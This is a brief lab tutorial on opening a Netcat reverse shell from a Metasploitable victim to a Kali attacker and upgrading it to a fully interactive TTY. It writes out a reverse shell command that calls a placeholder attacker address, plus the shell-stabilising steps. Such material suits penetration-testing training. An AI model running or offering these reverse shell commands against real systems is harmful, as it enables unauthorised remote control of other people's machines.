🎯 Objective

Learn simple techniques to stabilize Netcat reverse shells into fully interactive shells.

🛠️ Tools

Kali Linux VM (Attacker)

Metasploitable VM (Victim)

📝 Steps
1. Get a Reverse Shell

Start listener on Kali:

nc -l -v -n -p 443


Connect from Metasploitable:

nc <KALI-IP> 443 -e /bin/bash

2. Upgrade the Shell

Inside the reverse shell (on Kali):

Spawn TTY with Python:

python -c 'import pty; pty.spawn("/bin/bash")'


(or try python2 / python3)

Set terminal type:

export TERM=xterm


Background the shell:

Ctrl + Z


In Kali terminal, fix terminal mode & bring shell back:

stty raw -echo
fg
reset

✅ Result

Arrow keys, autocomplete, and Ctrl+C work normally.

You now have a fully interactive and stable shell.

🚨 Disclaimer

For educational use only. Do not run on systems you don’t own or control.
